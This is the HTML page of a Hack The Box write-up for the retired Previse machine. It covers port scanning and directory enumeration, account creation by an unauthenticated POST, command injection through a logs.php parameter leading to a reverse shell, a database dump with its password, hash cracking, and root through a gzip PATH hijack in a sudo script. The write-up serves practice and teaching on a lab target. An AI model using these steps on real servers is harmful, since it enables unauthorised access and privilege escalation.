@@ -1,0 +1,624 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+
+    <title>HTB Write-up | Previse</title>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="HandheldFriendly" content="True" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+    <link rel="stylesheet" type="text/css" href="../assets/built/screen.css%3Fv=67a0b9d52b.css" />
+
+    <link rel="canonical" href="index.html" />
+    <meta name="referrer" content="no-referrer-when-downgrade" />
+    <link rel="amphtml" href="amp/index.html" />
+    
+    <meta property="og:type" content="article" />
+    <meta property="og:title" content="HTB Write-up | Previse" />
+    <meta property="og:description" content="Retired machine can be found here.ScanningAs always, we start by mapping the previse.htb hostname to the given IP:  ~ sudo nano /etc/hosts 10.10.11.104  previse.htb... pretty boring, only a web server running on port 80 and an SSH server on port 22: ~ nmap 10.10." />
+    <meta property="og:url" content="inesmartins.github.io/htb-write-up-previse/" />
+    <meta property="og:image" content="inesmartins.github.io/content/images/2022/01/Screenshot-2022-01-05-at-15.03.17.png" />
+    <meta property="article:published_time" content="2022-01-21T11:04:08.000Z" />
+    <meta property="article:modified_time" content="2022-01-21T11:04:08.000Z" />
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:title" content="HTB Write-up | Previse" />
+    <meta name="twitter:description" content="Retired machine can be found here.ScanningAs always, we start by mapping the previse.htb hostname to the given IP:  ~ sudo nano /etc/hosts 10.10.11.104  previse.htb... pretty boring, only a web server running on port 80 and an SSH server on port 22: ~ nmap 10.10." />
+    <meta name="twitter:url" content="inesmartins.github.io/htb-write-up-previse/" />
+    <meta name="twitter:image" content="inesmartins.github.io/content/images/2022/01/Screenshot-2022-01-05-at-15.03.17.png" />
+    <meta name="twitter:label1" content="Written by" />
+    <meta name="twitter:data1" content="Inês Martins" />
+    <meta property="og:image:width" content="603" />
+    <meta property="og:image:height" content="379" />
+    
+    <script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "publisher": {
+        "@type": "Organization",
+        "name": "",
+        "url": "inesmartins.github.io/",
+        "logo": {
+            "@type": "ImageObject",
+            "url": "inesmartins.github.io/favicon.ico",
+            "width": 48,
+            "height": 48
+        }
+    },
+    "author": {
+        "@type": "Person",
+        "name": "Inês Martins",
+        "image": {
+            "@type": "ImageObject",
+            "url": "inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-22-at-21.31.59.png",
+            "width": 592,
+            "height": 572
+        },
+        "url": "inesmartins.github.io/author/ines/",
+        "sameAs": []
+    },
+    "headline": "HTB Write-up | Previse",
+    "url": "inesmartins.github.io/htb-write-up-previse/",
+    "datePublished": "2022-01-21T11:04:08.000Z",
+    "dateModified": "2022-01-21T11:04:08.000Z",
+    "image": {
+        "@type": "ImageObject",
+        "url": "inesmartins.github.io/content/images/2022/01/Screenshot-2022-01-05-at-15.03.17.png",
+        "width": 603,
+        "height": 379
+    },
+    "description": "&gt; Retired machine can be found here\n[https://www.hackthebox.com/home/machines/profile/373].\nScanning\nAs always, we start by mapping the previse.htb hostname to the given IP: \n\n~ sudo nano /etc/hosts\n\n10.10.11.104  previse.htb\n\n... pretty boring, only a web server running on port 80 and an SSH server on\nport 22:\n\n~ nmap 10.10.11.104\n\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\n\n~  nmap 10.10.11.104 -sC -sV -A -p 22,80\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.6p1 Ub",
+    "mainEntityOfPage": {
+        "@type": "WebPage",
+        "@id": "inesmartins.github.io/"
+    }
+}
+    </script>
+
+    <meta name="generator" content="Ghost 4.7" />
+    <link rel="alternate" type="application/rss+xml" title="" href="../rss/index.html" />
+    <script defer src="https://unpkg.com/@tryghost/portal@~1.5.1/umd/portal.min.js" data-ghost="inesmartins.github.io/"></script><style id="gh-members-styles">.gh-post-upgrade-cta-content,
+.gh-post-upgrade-cta {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+    text-align: center;
+    width: 100%;
+    color: #ffffff;
+    font-size: 16px;
+}
+
+.gh-post-upgrade-cta-content {
+    border-radius: 8px;
+    padding: 40px 4vw;
+}
+
+.gh-post-upgrade-cta h2 {
+    color: #ffffff;
+    font-size: 28px;
+    letter-spacing: -0.2px;
+    margin: 0;
+    padding: 0;
+}
+
+.gh-post-upgrade-cta p {
+    margin: 20px 0 0;
+    padding: 0;
+}
+
+.gh-post-upgrade-cta small {
+    font-size: 16px;
+    letter-spacing: -0.2px;
+}
+
+.gh-post-upgrade-cta a {
+    color: #ffffff;
+    cursor: pointer;
+    font-weight: 500;
+    box-shadow: none;
+    text-decoration: underline;
+}
+
+.gh-post-upgrade-cta a:hover {
+    color: #ffffff;
+    opacity: 0.8;
+    box-shadow: none;
+    text-decoration: underline;
+}
+
+.gh-post-upgrade-cta a.gh-btn {
+    display: block;
+    background: #ffffff;
+    text-decoration: none;
+    margin: 28px 0 0;
+    padding: 8px 18px;
+    border-radius: 4px;
+    font-size: 16px;
+    font-weight: 600;
+}
+
+.gh-post-upgrade-cta a.gh-btn:hover {
+    opacity: 0.92;
+}</style>
+    <link rel="icon" type="image/png" href="../content/images/2021/08/Screenshot-2021-08-22-at-21.31.59.png"/>
+<link rel="icon" type="image/png" href="../content/images/2021/08/Screenshot-2021-08-22-at-21.31.59.png"/>
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-180659126-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+  gtag('config', 'UA-180659126-1');
+</script>
+<script>
+    window.onload = function(e){ 
+	    var copyrightElement = document.getElementsByClassName('copyright')[0];
+    	copyrightElement.innerHTML = '<p>Inês Martins © 2021</p>'
+        copyrightElement.innerHTML += '<p>Contact: <a href="mailto:inesmartins.github.io@pm.me">inesmartins.github.io@pm.me</a></p>'
+	    copyrightElement.innerHTML += '<p>Banner by Josan Gonzalez aka <a href="https://www.artstation.com/josan">Death Burger</a>'
+        var footerNav = document.getElementsByClassName('site-footer-nav')[0];
+        footerNav.innerHTML = '<img src="http://www.hackthebox.eu/badge/image/172261" alt="Hack The Box">'
+	}
+</script>
+<!-- Styles -->
+<style>
+    .gh-head-actions,
+    .footer-cta, 
+    .gh-head-button {
+        display: none;
+    }
+    .article-image img {
+        max-height: 400px;
+        object-fit: contain;
+    }
+    .site-footer-nav {
+        display: block;
+    }
+    @media (max-width: 800px) {    
+	    .site-footer-nav {
+    	    margin: 20px auto;
+	    }
+    }
+</style><style>:root {--ghost-accent-color: #000000;}</style>
+
+</head>
+<body class="post-template">
+<div class="viewport">
+
+    <header id="gh-head" class="gh-head has-cover">
+        <nav class="gh-head-inner inner gh-container">
+
+            <div class="gh-head-brand">
+                <a class="gh-head-logo" href="../index.html">
+                        
+                </a>
+                <a class="gh-burger" role="button">
+                    <div class="gh-burger-box">
+                        <div class="gh-burger-inner"></div>
+                    </div>
+                </a>
+            </div>
+            <div class="gh-head-menu">
+                <ul class="nav">
+    <li class="nav-home"><a href="../index.html">Home</a></li>
+</ul>
+
+            </div>
+            <div class="gh-head-actions">
+                <div class="gh-social">
+                </div>
+
+                    <a class="gh-head-button" href="index.html#/portal/signup">Subscribe</a>
+            </div>
+        </nav>
+    </header>
+
+    <main>
+        
+
+
+
+<article class="article post">
+
+    <header class="article-header gh-canvas">
+
+
+        <h1 class="article-title">HTB Write-up | Previse</h1>
+
+
+        <div class="article-byline">
+            <section class="article-byline-content">
+                <ul class="author-list">
+                    <li class="author-list-item">
+                        <a href="../author/ines/index.html" class="author-avatar">
+                            <img class="author-profile-image" src="../content/images/size/w100/2021/08/Screenshot-2021-08-22-at-21.31.59.png" alt="Inês Martins" />
+                        </a>
+                    </li>
+                </ul>
+                <div class="article-byline-meta">
+                    <h4 class="author-name"><a href="../author/ines/index.html">Inês Martins</a></h4>
+                    <div class="byline-meta-content">
+                        <time class="byline-meta-date" datetime="2022-01-21">Jan 21, 2022</time>
+                        <span class="byline-reading-time"><span class="bull">&bull;</span> 7 min read</span>
+                    </div>
+                </div>
+            </section>
+        </div>
+
+        <figure class="article-image">
+            <img
+                srcset="../content/images/size/w300/2022/01/Screenshot-2022-01-05-at-15.03.17.png 300w,
+                       ../content/images/size/w600/2022/01/Screenshot-2022-01-05-at-15.03.17.png 600w,
+                      ../content/images/size/w1000/2022/01/Screenshot-2022-01-05-at-15.03.17.png 1000w,
+                     ../content/images/size/w2000/2022/01/Screenshot-2022-01-05-at-15.03.17.png 2000w"
+                sizes="(min-width: 1400px) 1400px, 92vw"
+                src="../content/images/size/w2000/2022/01/Screenshot-2022-01-05-at-15.03.17.png"
+                alt="HTB Write-up | Previse"
+            />
+        </figure>
+    </header>
+
+    <section class="gh-content gh-canvas">
+        <blockquote>Retired machine can be found <a href="https://www.hackthebox.com/home/machines/profile/373">here</a>.</blockquote><h2 id="scanning">Scanning</h2><p>As always, we start by mapping the <code>previse.htb</code> hostname to the given IP: </p><pre><code>~ sudo nano /etc/hosts
+
+10.10.11.104  previse.htb</code></pre><p>... pretty boring, only a web server running on port <code>80</code> and an SSH server on port <code>22</code>:</p><pre><code>~ nmap 10.10.11.104
+
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+~  nmap 10.10.11.104 -sC -sV -A -p 22,80
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA)
+|   256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA)
+|_  256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+| http-title: Previse Login
+|_Requested resource was login.php
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre><h2 id="enumeration">Enumeration</h2><p>When we access <a href="http://previse.htb">previse.htb</a> we're redirected to the login page:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="../content/images/2022/01/Screenshot-2022-01-02-at-10.32.16.png" class="kg-image" alt loading="lazy"></figure><p>Let's try to enumerate some directories and files with <code>gobuster</code>:</p><pre><code>~ gobuster dir \
+-u http://previse.htb \
+-c PHPSESSID=r989gcoqshohp5v8thvcji2sh2 \
+-x php \
+-w ../seclists/big.txt \   
+-s 200 -b 403,404 --wildcard
+
+[...]
+
+/accounts.php         (Status: 302) [Size: 3994] [--&gt; login.php]
+/config.php           (Status: 200) [Size: 0]                   
+/css                  (Status: 301) [Size: 308] [--&gt; http://previse.htb/css/]
+/download.php         (Status: 302) [Size: 0] [--&gt; login.php]                
+/favicon.ico          (Status: 200) [Size: 15406]                            
+/files.php            (Status: 302) [Size: 8377] [--&gt; login.php]             
+/footer.php           (Status: 200) [Size: 217]                              
+/header.php           (Status: 200) [Size: 980]                              
+/index.php            (Status: 302) [Size: 2801] [--&gt; login.php]             
+/js                   (Status: 301) [Size: 307] [--&gt; http://previse.htb/js/] 
+/login.php            (Status: 200) [Size: 2224]                             
+/logout.php           (Status: 302) [Size: 0] [--&gt; login.php]                
+/logs.php             (Status: 302) [Size: 0] [--&gt; login.php]
+/nav.php              (Status: 200) [Size: 1248]
+/status.php           (Status: 302) [Size: 2970] [--&gt; login.php] </code></pre><p>All of the pages either redirect to <code>login.php</code> or have no interesting content, except for the <code>nav.php</code> which has some interesting links:</p><figure class="kg-card kg-image-card"><img src="../content/images/2022/01/Screenshot-2022-01-02-at-10.39.37.png" class="kg-image" alt loading="lazy"></figure><p>The links are:</p><ul><li>Home: <code>/index.php</code></li><li>Accounts + Create Account: <code>/accounts.php</code></li><li>Files: <code>/files.php</code></li><li>Management Menu + Website Status: <code>/status.php</code></li><li>Log data: <code>/file_logs.php</code></li></ul><p>... but they all redirect to <code>login.php</code> since we're not authenticated.</p><h2 id="bypassing-authentication">Bypassing Authentication</h2><p>The <code>accounts.php</code> page seems the most interesting, maybe we can try some other HTTP methods:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="../content/images/2022/01/Screenshot-2022-01-02-at-11.24.01.png" class="kg-image" alt loading="lazy"></figure><pre><code>POST /accounts.php HTTP/1.1
+Host: previse.htb
+Content-Length: 57
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:95.0) Gecko/20100101 Firefox/95.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: pt-PT,pt;q=0.8,en;q=0.5,en-US;q=0.3
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: PHPSESSID=prod44vfotfs0nvgir215458f0
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+
+username=inesmartins&amp;password=ines12345&amp;confirm=ines12345</code></pre><p>Using this <code>POST</code> request we can create a new user and log in:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="../content/images/2022/01/Screenshot-2022-01-02-at-11.24.38.png" class="kg-image" alt loading="lazy" width="1440" height="427" srcset="../content/images/size/w600/2022/01/Screenshot-2022-01-02-at-11.24.38.png 600w, ../content/images/size/w1000/2022/01/Screenshot-2022-01-02-at-11.24.38.png 1000w, ../content/images/2022/01/Screenshot-2022-01-02-at-11.24.38.png 1440w" sizes="(min-width: 1200px) 1200px"></figure><h2 id="exploring-the-website">Exploring the website</h2><p>On the <code>files.php</code> page there are clearly some attempts to upload reverse shells, as well as a <code>zip</code> file that contains the site backup:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="../content/images/2022/01/Screenshot-2022-01-02-at-11.25.33.png" class="kg-image" alt loading="lazy" width="1440" height="686" srcset="../content/images/size/w600/2022/01/Screenshot-2022-01-02-at-11.25.33.png 600w, ../content/images/size/w1000/2022/01/Screenshot-2022-01-02-at-11.25.33.png 1000w, ../content/images/2022/01/Screenshot-2022-01-02-at-11.25.33.png 1440w" sizes="(min-width: 1200px) 1200px"></figure><p>In the backup we can see the <code>config.php</code> file contains the DB credentials:</p><figure class="kg-card kg-image-card"><img src="../content/images/2022/01/Screenshot-2022-01-02-at-11.27.06.png" class="kg-image" alt loading="lazy" width="650" height="366" srcset="../content/images/size/w600/2022/01/Screenshot-2022-01-02-at-11.27.06.png 600w, ../content/images/2022/01/Screenshot-2022-01-02-at-11.27.06.png 650w"></figure><p>But the <code>logs.php</code> has the most potential, since there's a call to an <code>exec</code> function that uses a parameter sent via <code>POST</code> request:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="../content/images/2022/01/Screenshot-2022-01-02-at-11.29.44.png" class="kg-image" alt loading="lazy" width="891" height="582" srcset="../content/images/size/w600/2022/01/Screenshot-2022-01-02-at-11.29.44.png 600w, ../content/images/2022/01/Screenshot-2022-01-02-at-11.29.44.png 891w"></figure><figure class="kg-card kg-image-card"><img src="../content/images/2022/01/Screenshot-2022-01-02-at-11.31.43.png" class="kg-image" alt loading="lazy" width="1440" height="510" srcset="../content/images/size/w600/2022/01/Screenshot-2022-01-02-at-11.31.43.png 600w, ../content/images/size/w1000/2022/01/Screenshot-2022-01-02-at-11.31.43.png 1000w, ../content/images/2022/01/Screenshot-2022-01-02-at-11.31.43.png 1440w" sizes="(min-width: 720px) 720px"></figure><p>We already know the format of this <code>POST</code> request since it's the one performed on the <code>file_logs.php</code> file:</p><pre><code>POST /logs.php HTTP/1.1
+Host: previse.htb
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:95.0) Gecko/20100101 Firefox/95.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: pt-PT,pt;q=0.8,en;q=0.5,en-US;q=0.3
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 49
+Origin: http://previse.htb
+Connection: close
+Referer: http://previse.htb/file_logs.php
+Cookie: PHPSESSID=prod44vfotfs0nvgir215458f0
+Upgrade-Insecure-Requests: 1
+
+delim=tab</code></pre><p>When we change this <code>delim</code> parameter to send a <code>curl</code> request to a simple local web server we get a ping back!</p><figure class="kg-card kg-image-card kg-width-wide"><img src="../content/images/2022/01/Screenshot-2022-01-04-at-13.29.05.png" class="kg-image" alt loading="lazy" width="1440" height="583" srcset="../content/images/size/w600/2022/01/Screenshot-2022-01-04-at-13.29.05.png 600w, ../content/images/size/w1000/2022/01/Screenshot-2022-01-04-at-13.29.05.png 1000w, ../content/images/2022/01/Screenshot-2022-01-04-at-13.29.05.png 1440w" sizes="(min-width: 1200px) 1200px"></figure><p>So, let's go for the reverse shell:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="../content/images/2022/01/Screenshot-2022-01-04-at-13.31.37.png" class="kg-image" alt loading="lazy"></figure><p>We're in!</p><hr><h2 id="becoming-m4lwhere">Becoming m4lwhere</h2><p>First order of business: upgrade the shell!</p><pre><code class="language-python">~ python -c 'import pty; pty.spawn("/bin/bash")'</code></pre><p>Let's see what else is there:</p><pre><code>bash-4.4$ cat /etc/passwd
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+lxd:x:105:65534::/var/lib/lxd/:/bin/false
+uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
+dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:109:1::/var/cache/pollinate:/bin/false
+sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
+m4lwhere:x:1000:1000:m4lwhere:/home/m4lwhere:/bin/bash
+mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false</code></pre><p>We have access to <code>m4lwhere</code>'s home directory, but not to the user flag:</p><pre><code>bash-4.4$ cd /home/m4lwhere
+
+bash-4.4$ ls
+user.txt
+
+bash-4.4$ cat user.txt
+cat: user.txt: Permission denied</code></pre><p>Let's dump the database, since we already have the creds:</p><pre><code>~ mysqldump -u root -p --all-databases &gt; db_dump.sql
+
+Enter password: mySQL_p@ssw0rd!:)
+</code></pre><p>There's a hashed password for the <code>m4lwhere</code> user on the <code>accounts</code> table:</p><pre><code class="language-sql">CREATE TABLE `accounts` (
+  `id` int(11) NOT NULL AUTO_INCREMENT,
+  `username` varchar(50) NOT NULL,
+  `password` varchar(255) NOT NULL,
+  `created_at` datetime DEFAULT CURRENT_TIMESTAMP,
+  PRIMARY KEY (`id`),
+  UNIQUE KEY `username` (`username`)
+) ENGINE=InnoDB AUTO_INCREMENT=5 DEFAULT CHARSET=latin1;
+
+INSERT INTO `accounts` VALUES 
+(1,'m4lwhere','$1$ðŸ§‚llol$DQpmdvnb7EeuO6UaqRItf.','2021-05-27 18:18:36'),
+[...]</code></pre><p>Save me <code>hashcat</code>:</p><pre><code>~ nano hash
+
+$1$🧂llol$DQpmdvnb7EeuO6UaqRItf.
+
+~ hashcat -a 0 -m 500 hash ../seclists/pwds/rockyou.txt --show
+$1$🧂llol$DQpmdvnb7EeuO6UaqRItf.:ilovecody112235!</code></pre><p>We got the password!</p><pre><code>~ ssh m4lwhere@previse.htb
+
+m4lwhere@previse.htb's password: 
+&gt; ilovecody112235!
+
+[...]
+
+bash-4.4$ cat user.txt 
+cff266072b891cf5458d490516040d5b</code></pre><hr><h2 id="road-to-root">Road to root</h2><p>After some poking around I went back to the <code>/opt/script</code> directory:</p><pre><code>bash-4.4$ cd /opt/scripts/
+
+bash-4.4$ ls -la
+total 16
+drwxr-xr-x 2 root     root     4096 Jul 26 18:41 .
+drwxr-xr-x 3 root     root     4096 Jul 26 18:41 ..
+-rwxr-xr-x 1 root     root      486 Jun  6  2021 access_backup.sh
+-rw-r--r-- 1 m4lwhere m4lwhere  320 Jun  6  2021 log_process.py</code></pre><p>The <code>access_backup.sh</code> file looks very interesting:</p><pre><code>bash-4.4$ cat access_backup.sh
+#!/bin/bash
+
+# We always make sure to store logs, we take security SERIOUSLY here
+
+# I know I shouldnt run this as root but I cant figure it out programmatically on my account
+# This is configured to run with cron, added to sudo so I can run as needed - we'll fix it later when there's time
+
+gzip -c /var/log/apache2/access.log &gt; /var/backups/$(date --date="yesterday" +%Y%b%d)_access.gz
+gzip -c /var/www/file_access.log &gt; /var/backups/$(date --date="yesterday" +%Y%b%d)_file_access.gz</code></pre><p>OK, what if we poison the <code>gzip</code> binary:</p><pre><code>bash-4.4$ which gzip
+/bin/gzip
+
+bash-4.4$ echo $PATH
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+
+bash-4.4$ echo "rm /tmp/pwd" &gt; /tmp/gzip
+bash-4.4$ chmod 777 /tmp/gzip 
+bash-4.4$ export PATH=/tmp:$PATH
+bash-4.4$ cd /opt/scripts/
+bash-4.4$ sudo ./access_backup.sh 
+&gt; ilovecody112235!
+bash-4.4$ cat /tmp/pwd 
+b3ca53edb5aecbbc2cd1456f3454cb47</code></pre><p>We're done babyyyyy!</p><hr>
+    </section>
+
+
+</article>
+
+<section class="footer-cta">
+    <div class="inner">
+        <h2>Sign up for more like this.</h2>
+        <a class="footer-cta-button" href="index.html#/portal">
+            <div>Enter your email</div>
+            <span>Subscribe</span>
+        </a>
+    </div>
+</section>
+
+
+<aside class="read-more-wrap">
+    <div class="read-more inner">
+
+
+                    
+<article class="post-card post ">
+
+    <a class="post-card-image-link" href="../htb-write-up-bountyhunter/index.html">
+        <img class="post-card-image"
+            srcset="../content/images/size/w300/2021/12/Screenshot-2021-12-31-at-11.14.19.png 300w,
+                   ../content/images/size/w600/2021/12/Screenshot-2021-12-31-at-11.14.19.png 600w,
+                  ../content/images/size/w1000/2021/12/Screenshot-2021-12-31-at-11.14.19.png 1000w,
+                 ../content/images/size/w2000/2021/12/Screenshot-2021-12-31-at-11.14.19.png 2000w"
+            sizes="(max-width: 1000px) 400px, 800px"
+            src="../content/images/size/w600/2021/12/Screenshot-2021-12-31-at-11.14.19.png"
+            alt="HTB Write-up | BountyHunter"
+            loading="lazy"
+        />
+    </a>
+
+    <div class="post-card-content">
+
+        <a class="post-card-content-link" href="../htb-write-up-bountyhunter/index.html">
+            <header class="post-card-header">
+                <h2 class="post-card-title">HTB Write-up | BountyHunter</h2>
+            </header>
+            <section class="post-card-excerpt">
+                <p>Retired machine can be found here.ScanningLike with most HTB machines, a quick scan only disclosed SSH running on port 22 and a web server running on port 80: ~ nmap 10.10.11.100 PORT   STATE SERVICE 22/tcp open  ssh 80/tcp open  http ~ nmap 10.10.11.100</p>
+            </section>
+        </a>
+
+        <footer class="post-card-meta">
+            <ul class="author-list">
+                <li class="author-list-item">
+                    <a href="../author/ines/index.html" class="static-avatar">
+                        <img class="author-profile-image" src="../content/images/size/w100/2021/08/Screenshot-2021-08-22-at-21.31.59.png" alt="Inês Martins" />
+                    </a>
+                </li>
+            </ul>
+            <div class="post-card-byline-content">
+                <span><a href="../author/ines/index.html">Inês Martins</a></span>
+                <span class="post-card-byline-date"><time datetime="2021-11-29">Nov 29, 2021</time> <span class="bull">&bull;</span> 7 min read</span>
+            </div>
+        </footer>
+
+    </div>
+
+</article>
+                    
+<article class="post-card post ">
+
+    <a class="post-card-image-link" href="../htb-write-up-explore/index.html">
+        <img class="post-card-image"
+            srcset="../content/images/size/w300/2021/08/Screenshot-2021-08-01-at-15.59.58.png 300w,
+                   ../content/images/size/w600/2021/08/Screenshot-2021-08-01-at-15.59.58.png 600w,
+                  ../content/images/size/w1000/2021/08/Screenshot-2021-08-01-at-15.59.58.png 1000w,
+                 ../content/images/size/w2000/2021/08/Screenshot-2021-08-01-at-15.59.58.png 2000w"
+            sizes="(max-width: 1000px) 400px, 800px"
+            src="../content/images/size/w600/2021/08/Screenshot-2021-08-01-at-15.59.58.png"
+            alt="HTB Write-up | Explore"
+            loading="lazy"
+        />
+    </a>
+
+    <div class="post-card-content">
+
+        <a class="post-card-content-link" href="../htb-write-up-explore/index.html">
+            <header class="post-card-header">
+                <h2 class="post-card-title">HTB Write-up | Explore</h2>
+            </header>
+            <section class="post-card-excerpt">
+                <p>Retired machine can be found here.esketitLet's start with some basic scanning: ~ nmap -A 10.10.10.247 PORT     STATE    SERVICE    VERSION 2222/tcp open     ssh     (protocol 2.0) | fingerprint-strings:  |   NULL:  |_    SSH-2.0-SSH Server - Banana Studio | ssh-hostkey:  |_  2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:</p>
+            </section>
+        </a>
+
+        <footer class="post-card-meta">
+            <ul class="author-list">
+                <li class="author-list-item">
+                    <a href="../author/ines/index.html" class="static-avatar">
+                        <img class="author-profile-image" src="../content/images/size/w100/2021/08/Screenshot-2021-08-22-at-21.31.59.png" alt="Inês Martins" />
+                    </a>
+                </li>
+            </ul>
+            <div class="post-card-byline-content">
+                <span><a href="../author/ines/index.html">Inês Martins</a></span>
+                <span class="post-card-byline-date"><time datetime="2021-10-30">Oct 30, 2021</time> <span class="bull">&bull;</span> 3 min read</span>
+            </div>
+        </footer>
+
+    </div>
+
+</article>
+                    
+<article class="post-card post ">
+
+    <a class="post-card-image-link" href="../exploiting-deep-links-in-android-pat-5-testing/index.html">
+        <img class="post-card-image"
+            srcset="../content/images/size/w300/2021/10/maxresdefault-1-1.jpeg 300w,
+                   ../content/images/size/w600/2021/10/maxresdefault-1-1.jpeg 600w,
+                  ../content/images/size/w1000/2021/10/maxresdefault-1-1.jpeg 1000w,
+                 ../content/images/size/w2000/2021/10/maxresdefault-1-1.jpeg 2000w"
+            sizes="(max-width: 1000px) 400px, 800px"
+            src="../content/images/size/w600/2021/10/maxresdefault-1-1.jpeg"
+            alt="Exploiting Deep Links in Android - Part 5 (Testing)"
+            loading="lazy"
+        />
+    </a>
+
+    <div class="post-card-content">
+
+        <a class="post-card-content-link" href="../exploiting-deep-links-in-android-pat-5-testing/index.html">
+            <header class="post-card-header">
+                <h2 class="post-card-title">Exploiting Deep Links in Android - Part 5 (Testing)</h2>
+            </header>
+            <section class="post-card-excerpt">
+                <p>EnumerationEnumeration should always start with the App Manifest, which can be extracted from any .apk with a tool such as apktool, e.g.: ~ apktool d com.twitter.android_2021-10-22.apk  I: Using Apktool 2.5.0 on com.twitter.android_2021-10-22.apk I: Loading resource table... I: Decoding AndroidManifest.xml</p>
+            </section>
+        </a>
+
+        <footer class="post-card-meta">
+            <ul class="author-list">
+                <li class="author-list-item">
+                    <a href="../author/ines/index.html" class="static-avatar">
+                        <img class="author-profile-image" src="../content/images/size/w100/2021/08/Screenshot-2021-08-22-at-21.31.59.png" alt="Inês Martins" />
+                    </a>
+                </li>
+            </ul>
+            <div class="post-card-byline-content">
+                <span><a href="../author/ines/index.html">Inês Martins</a></span>
+                <span class="post-card-byline-date"><time datetime="2021-10-30">Oct 30, 2021</time> <span class="bull">&bull;</span> 4 min read</span>
+            </div>
+        </footer>
+
+    </div>
+
+</article>
+
+    </div>
+</aside>
+
+
+    </main>
+
+    <footer class="site-footer outer">
+        <div class="inner">
+            <section class="copyright"><a href="../index.html"></a> &copy; 2022</section>
+            <nav class="site-footer-nav">
+                
+            </nav>
+            <div><a href="https://ghost.org/" target="_blank" rel="noopener">Powered by Ghost</a></div>
+        </div>
+    </footer>
+
+</div>
+
+
+<script
+    src="https://code.jquery.com/jquery-3.5.1.min.js"
+    integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0="
+    crossorigin="anonymous">
+</script>
+<script src="../assets/built/casper.js%3Fv=67a0b9d52b"></script>
+<script>
+$(document).ready(function () {
+    // Mobile Menu Trigger
+    $('.gh-burger').click(function () {
+        $('body').toggleClass('gh-head-open');
+    });
+    // FitVids - Makes video embeds responsive
+    $(".gh-content").fitVids();
+});
+</script>
+
+
+
